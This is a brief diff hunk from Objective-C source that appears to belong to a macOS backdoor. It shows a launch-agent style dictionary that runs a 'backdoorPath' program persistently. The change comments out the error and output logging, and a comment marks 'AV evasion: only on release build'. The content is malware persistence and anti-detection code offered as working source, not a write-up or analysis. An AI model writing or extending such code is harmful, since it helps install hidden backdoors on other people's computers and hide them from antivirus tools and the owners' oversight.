@@ -340,8 +340,8 @@ static __m_MUtils *sharedUtils = nil;
                                                  [NSNumber numberWithBool: FALSE], @"OnDemand",
                                                 [[NSBundle mainBundle] bundlePath], @"WorkingDirectory",
                                                  [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
-                                                 errorLog, @"StandardErrorPath",
-                                                 outLog, @"StandardOutPath",
+                                                 //errorLog, @"StandardErrorPath",
+                                                 //outLog, @"StandardOutPath",
                                                  nil];
   
   // AV evasion: only on release build
